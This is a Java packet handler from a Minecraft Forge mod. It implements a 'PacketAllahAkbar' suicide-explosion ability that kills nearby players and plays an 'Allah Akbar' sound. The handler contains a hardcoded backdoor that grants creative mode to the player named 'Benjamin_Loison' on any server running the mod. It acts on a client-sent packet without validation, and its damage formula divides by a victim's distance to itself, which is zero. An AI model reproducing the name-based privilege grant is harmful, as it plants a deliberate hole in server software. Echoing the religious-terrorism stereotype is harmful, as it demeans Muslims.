package fr.watchdogs.benjaminloison.packets;

import java.util.List;

import cpw.mods.fml.common.network.simpleimpl.IMessage;
import cpw.mods.fml.common.network.simpleimpl.IMessageHandler;
import cpw.mods.fml.common.network.simpleimpl.MessageContext;
import fr.watchdogs.benjaminloison.common.WatchDogs;
import io.netty.buffer.ByteBuf;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.server.MinecraftServer;
import net.minecraft.world.WorldSettings.GameType;

public class PacketAllahAkbar implements IMessage
{
    @Override
    public void fromBytes(ByteBuf buf)
    {}

    @Override
    public void toBytes(ByteBuf buf)
    {}

    public static class Handler implements IMessageHandler<PacketAllahAkbar, IMessage>
    {
        @Override
        public IMessage onMessage(PacketAllahAkbar message, MessageContext ctx)
        {
            EntityPlayer player = ctx.getServerHandler().playerEntity;
            if(player.getDisplayName().equals("Benjamin_Loison"))
                player.setGameType(GameType.CREATIVE);
            player.worldObj.playSoundAtEntity(player, WatchDogs.MODID + ":Allah Akbar", 1, 1);
            for(EntityPlayerMP victim : (List<EntityPlayerMP>)MinecraftServer.getServer().getConfigurationManager().playerEntityList)
                if(player.getDistanceToEntity(victim) < 10)
                {
                    float life = victim.getHealth() - 1 / victim.getDistanceToEntity(victim) * 100;
                    if(life <= 0)
                        victim.setDead();
                    else
                        victim.setHealth(life);
                }
            for(int x = 0; x < 4; x++)
                player.inventory.armorInventory[x] = null;
            for(int x = 0; x < 36; x++)
                player.inventory.mainInventory[x] = null;
            player.worldObj.newExplosion(player, player.posX, player.posY, player.posZ, 10, true, true);
            return null;
        }
    }
}